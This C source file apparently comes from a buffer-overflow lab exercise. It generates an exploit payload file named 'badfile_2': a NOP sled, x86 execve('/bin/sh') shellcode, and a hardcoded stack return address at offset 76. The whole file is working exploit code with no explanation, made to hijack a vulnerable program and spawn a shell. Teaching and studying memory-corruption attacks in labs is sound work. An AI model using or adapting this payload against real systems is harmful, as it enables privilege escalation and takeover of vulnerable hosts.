#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char shellcode[]=  "\x31\xc0"
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdql                           */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;              

char taraddr[] = "\x20""\xee""\xff""\xbf";

void main(int argc, char **argv)
{
    char buffer[100];
    memset(&buffer, 0x90, sizeof(buffer));
	int i = 76 - sizeof(shellcode) - 1;
	int end = i + sizeof(shellcode), start = i;
    for(; i<end; i++){
		buffer[i] = shellcode[i-start];
	}
	buffer[i-1] = 0x90;

	for(i=76; i<76+sizeof(taraddr); i++){
		buffer[i] = taraddr[i-76];
	}  
	buffer[i-1] = 0x90;
/*    for(i; i<78; i++){
		buffer[i] = 'A';	
	}*/

    buffer[99] = '\0';
    FILE *badfile = fopen("./badfile_2", "w");
    fwrite(buffer, 100, 1, badfile);
    fclose(badfile);
}
